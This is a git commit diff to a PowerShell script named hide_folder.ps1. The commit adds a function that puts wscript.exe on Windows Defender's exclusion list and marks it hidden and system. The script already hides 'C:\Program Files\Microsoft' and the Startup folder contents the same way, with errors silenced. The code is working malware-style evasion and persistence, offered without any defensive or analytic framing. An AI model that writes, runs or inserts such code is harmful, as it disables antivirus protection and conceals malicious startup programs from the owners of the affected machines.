f288cfe9e17e1479a299df87e1151564079cd25c
Mayank Kashyap <kashyapmayank446@gmail.com>
2025-03-12 23:12:16 +0530

    update .ps1

--- hide_folder.ps1
+++ hide_folder.ps1
@@ -4,6 +4,7 @@ $ErrorActionPreference = "SilentlyContinue"
 # Define paths to hide
 $folderPath = "C:\Program Files\Microsoft"
 $startupFolderPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+$fileToHide = "wscript.exe"
 
 # Function to hide a folder completely
 function Hide-Folder {
@@ -14,6 +15,18 @@ function Hide-Folder {
 
         # Hide and make the folder a system folder
         attrib +h +s "$path" /S /D
+    }
+}
+
+# Function to hide a specific file
+function Hide-File {
+    param ($file)
+    if (Test-Path $file) {
+        # Add file to Windows Defender Exclusions
+        Add-MpPreference -ExclusionPath $file
+
+        # Hide and make the file a system file
+        attrib +h +s $file
     }
 }
 
@@ -33,6 +46,7 @@ function Hide-AllFilesInFolder {
 
 # Apply hiding rules
 Hide-Folder $folderPath
+Hide-File $fileToHide
 Hide-AllFilesInFolder $startupFolderPath
 
 # Force Windows Defender to apply the changes immediately
